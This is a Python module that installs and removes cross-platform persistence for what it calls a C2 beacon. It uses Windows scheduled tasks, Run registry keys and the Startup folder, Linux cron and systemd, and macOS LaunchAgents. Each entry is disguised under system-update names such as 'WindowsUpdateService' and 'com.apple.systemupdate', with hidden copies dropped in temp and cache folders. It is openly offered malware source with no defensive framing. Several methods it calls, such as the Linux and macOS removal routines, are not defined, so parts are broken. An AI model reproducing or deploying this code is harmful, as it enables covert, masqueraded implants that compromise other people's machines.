#!/usr/bin/env python3
"""
Cross-platform persistence mechanisms
"""
import os
import sys
import platform
import subprocess
import shutil
from pathlib import Path
from typing import List, Dict
import asyncio

class CrossPlatformPersistence:
    """Cross-platform persistence implementation"""
    
    def __init__(self):
        self.system = platform.system()
        self.install_paths = self._get_install_paths()
        self.techniques = self._get_persistence_techniques()
    
    def _get_install_paths(self) -> Dict[str, str]:
        """Get platform-specific installation paths"""
        if self.system == "Windows":
            return {
                'user_startup': os.path.expandvars('%APPDATA%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup'),
                'system_startup': 'C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp',
                'temp': os.environ.get('TEMP', 'C:\\Windows\\Temp'),
                'program_files': os.environ.get('PROGRAMFILES', 'C:\\Program Files')
            }
        elif self.system == "Linux":
            return {
                'user_cron': '/var/spool/cron/crontabs',
                'system_cron': '/etc/cron.d',
                'systemd_user': os.path.expanduser('~/.config/systemd/user'),
                'systemd_system': '/etc/systemd/system',
                'profile': os.path.expanduser('~/.profile'),
                'bashrc': os.path.expanduser('~/.bashrc')
            }
        elif self.system == "Darwin":
            return {
                'launch_agents_user': os.path.expanduser('~/Library/LaunchAgents'),
                'launch_agents_system': '/Library/LaunchAgents',
                'launch_daemons': '/Library/LaunchDaemons',
                'profile': os.path.expanduser('~/.profile')
            }
        else:
            return {}
    
    def _get_persistence_techniques(self) -> List[str]:
        """Get available persistence techniques for current platform"""
        if self.system == "Windows":
            return ['scheduled_task', 'registry_run', 'startup_folder', 'service']
        elif self.system == "Linux":
            return ['cron', 'systemd', 'profile', 'bashrc', 'rc_local']
        elif self.system == "Darwin":
            return ['launch_agent', 'launch_daemon', 'cron', 'profile']
        else:
            return []
    
    async def install(self) -> bool:
        """Install persistence mechanism"""
        print(f"🔧 Installing persistence on {self.system}...")
        
        try:
            if self.system == "Windows":
                return await self._install_windows()
            elif self.system == "Linux":
                return await self._install_linux()
            elif self.system == "Darwin":
                return await self._install_macos()
            else:
                print(f"❌ Unsupported platform: {self.system}")
                return False
                
        except Exception as e:
            print(f"❌ Persistence installation failed: {e}")
            return False
    
    async def _install_windows(self) -> bool:
        """Install Windows persistence"""
        techniques = [
            self._install_windows_scheduled_task,
            self._install_windows_registry_run,
            self._install_windows_startup_folder
        ]
        
        # Try techniques until one succeeds
        for technique in techniques:
            try:
                if await technique():
                    print("✅ Windows persistence installed successfully")
                    return True
            except Exception as e:
                print(f"⚠️  Persistence technique failed: {e}")
                continue
        
        return False
    
    async def _install_windows_scheduled_task(self) -> bool:
        """Install Windows scheduled task"""
        try:
            script_path = self._deploy_beacon_script()
            
            # Create scheduled task using schtasks
            task_name = "WindowsUpdateService"
            cmd = [
                'schtasks', '/create', '/tn', task_name, '/tr',
                f'"{sys.executable}" "{script_path}"', '/sc',
                'minute', '/mo', '5', '/f'
            ]
            
            result = subprocess.run(cmd, capture_output=True, text=True)
            return result.returncode == 0
            
        except Exception as e:
            print(f"Scheduled task creation failed: {e}")
            return False
    
    async def _install_windows_registry_run(self) -> bool:
        """Install Windows Registry Run key"""
        try:
            import winreg
            
            script_path = self._deploy_beacon_script()
            key_path = r"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run"
            
            with winreg.OpenKey(winreg.HKEY_CURRENT_USER, key_path, 0, 
                              winreg.KEY_SET_VALUE) as key:
                winreg.SetValueEx(key, "WindowsUpdate", 0, winreg.REG_SZ,
                                f'"{sys.executable}" "{script_path}"')
            
            return True
            
        except Exception as e:
            print(f"Registry persistence failed: {e}")
            return False
    
    async def _install_windows_startup_folder(self) -> bool:
        """Install in Windows startup folder"""
        try:
            script_path = self._deploy_beacon_script()
            startup_path = self.install_paths['user_startup']
            
            # Create shortcut or copy script
            shortcut_path = os.path.join(startup_path, "WindowsUpdate.lnk")
            
            # For simplicity, copy the script
            shutil.copy2(script_path, 
                        os.path.join(startup_path, "windows_update.py"))
            
            return True
            
        except Exception as e:
            print(f"Startup folder persistence failed: {e}")
            return False
    
    async def _install_linux(self) -> bool:
        """Install Linux persistence"""
        techniques = [
            self._install_linux_cron,
            self._install_linux_systemd,
            self._install_linux_profile
        ]
        
        for technique in techniques:
            try:
                if await technique():
                    print("✅ Linux persistence installed successfully")
                    return True
            except Exception as e:
                print(f"⚠️  Persistence technique failed: {e}")
                continue
        
        return False
    
    async def _install_linux_cron(self) -> bool:
        """Install Linux cron job"""
        try:
            script_path = self._deploy_beacon_script()
            
            # Add to user crontab
            cron_line = f"*/5 * * * * {sys.executable} {script_path}\n"
            
            # Get current crontab
            result = subprocess.run(['crontab', '-l'], capture_output=True, text=True)
            current_cron = result.stdout if result.returncode == 0 else ""
            
            # Add our line if not already present
            if script_path not in current_cron:
                new_cron = current_cron + cron_line
                subprocess.run(['crontab', '-'], input=new_cron, text=True)
            
            return True
            
        except Exception as e:
            print(f"Cron persistence failed: {e}")
            return False
    
    async def _install_linux_systemd(self) -> bool:
        """Install Linux systemd service"""
        try:
            script_path = self._deploy_beacon_script()
            service_content = f"""[Unit]
Description=System Update Service
After=network.target

[Service]
Type=simple
ExecStart={sys.executable} {script_path}
Restart=always
RestartSec=60
User={os.getenv('USER')}

[Install]
WantedBy=default.target
"""
            
            service_path = os.path.join(
                self.install_paths['systemd_user'],
                'system-update.service'
            )
            
            os.makedirs(os.path.dirname(service_path), exist_ok=True)
            with open(service_path, 'w') as f:
                f.write(service_content)
            
            # Enable and start the service
            subprocess.run(['systemctl', '--user', 'enable', 'system-update.service'])
            subprocess.run(['systemctl', '--user', 'start', 'system-update.service'])
            
            return True
            
        except Exception as e:
            print(f"Systemd persistence failed: {e}")
            return False
    
    async def _install_macos(self) -> bool:
        """Install macOS persistence"""
        techniques = [
            self._install_macos_launch_agent,
            self._install_macos_cron
        ]
        
        for technique in techniques:
            try:
                if await technique():
                    print("✅ macOS persistence installed successfully")
                    return True
            except Exception as e:
                print(f"⚠️  Persistence technique failed: {e}")
                continue
        
        return False
    
    async def _install_macos_launch_agent(self) -> bool:
        """Install macOS launch agent"""
        try:
            script_path = self._deploy_beacon_script()
            agent_content = f"""<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>Label</key>
    <string>com.apple.systemupdate</string>
    <key>ProgramArguments</key>
    <array>
        <string>{sys.executable}</string>
        <string>{script_path}</string>
    </array>
    <key>RunAtLoad</key>
    <true/>
    <key>StartInterval</key>
    <integer>300</integer>
    <key>KeepAlive</key>
    <false/>
</dict>
</plist>
"""
            
            agent_path = os.path.join(
                self.install_paths['launch_agents_user'],
                'com.apple.systemupdate.plist'
            )
            
            os.makedirs(os.path.dirname(agent_path), exist_ok=True)
            with open(agent_path, 'w') as f:
                f.write(agent_content)
            
            # Load the launch agent
            subprocess.run(['launchctl', 'load', agent_path])
            
            return True
            
        except Exception as e:
            print(f"Launch agent persistence failed: {e}")
            return False
    
    def _deploy_beacon_script(self) -> str:
        """Deploy beacon script to persistent location"""
        # Get current script path
        if getattr(sys, 'frozen', False):
            # Running as compiled executable
            current_path = sys.executable
        else:
            # Running as Python script
            current_path = __file__
        
        # Choose deployment location
        if self.system == "Windows":
            deploy_dir = self.install_paths['temp']
            deploy_name = "windows_update.py"
        elif self.system == "Linux":
            deploy_dir = "/tmp"
            deploy_name = ".system_update.py"
        elif self.system == "Darwin":
            deploy_dir = os.path.expanduser("~/Library/Caches")
            deploy_name = ".system_update.py"
        else:
            deploy_dir = os.path.dirname(current_path)
            deploy_name = "beacon.py"
        
        deploy_path = os.path.join(deploy_dir, deploy_name)
        
        # Copy current script to deployment location
        try:
            if getattr(sys, 'frozen', False):
                shutil.copy2(current_path, deploy_path)
            else:
                # For scripts, we need to create a proper beacon launcher
                launcher_content = self._generate_beacon_launcher()
                with open(deploy_path, 'w') as f:
                    f.write(launcher_content)
                
                # Make executable on Unix-like systems
                if self.system in ["Linux", "Darwin"]:
                    os.chmod(deploy_path, 0o755)
        
        except Exception as e:
            print(f"Script deployment failed: {e}")
            # Fallback to current location
            deploy_path = current_path
        
        return deploy_path
    
    def _generate_beacon_launcher(self) -> str:
        """Generate beacon launcher script"""
        return f'''#!/usr/bin/env python3
"""
Professional C2 Beacon Launcher
"""
import os
import sys
import asyncio

# Add core module to path
core_path = os.path.join(os.path.dirname(__file__), "..", "core")
sys.path.insert(0, core_path)

from beacon import main

if __name__ == "__main__":
    asyncio.run(main())
'''
    
    async def remove(self) -> bool:
        """Remove persistence mechanisms"""
        print("🧹 Removing persistence...")
        
        try:
            if self.system == "Windows":
                return await self._remove_windows()
            elif self.system == "Linux":
                return await self._remove_linux()
            elif self.system == "Darwin":
                return await self._remove_macos()
            else:
                return False
                
        except Exception as e:
            print(f"❌ Persistence removal failed: {e}")
            return False
    
    async def _remove_windows(self) -> bool:
        """Remove Windows persistence"""
        try:
            # Remove scheduled task
            subprocess.run(['schtasks', '/delete', '/tn', 'WindowsUpdateService', '/f'], 
                         capture_output=True)
            
            # Remove registry entry
            import winreg
            try:
                key_path = r"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run"
                with winreg.OpenKey(winreg.HKEY_CURRENT_USER, key_path, 0, 
                                  winreg.KEY_SET_VALUE) as key:
                    winreg.DeleteValue(key, "WindowsUpdate")
            except:
                pass
            
            # Remove startup folder entry
            startup_path = self.install_paths['user_startup']
            startup_file = os.path.join(startup_path, "windows_update.py")
            if os.path.exists(startup_file):
                os.remove(startup_file)
            
            return True
            
        except Exception as e:
            print(f"Windows persistence removal failed: {e}")
            return False
    
    async def cleanup(self):
        """Cleanup persistence resources"""
        await self.remove()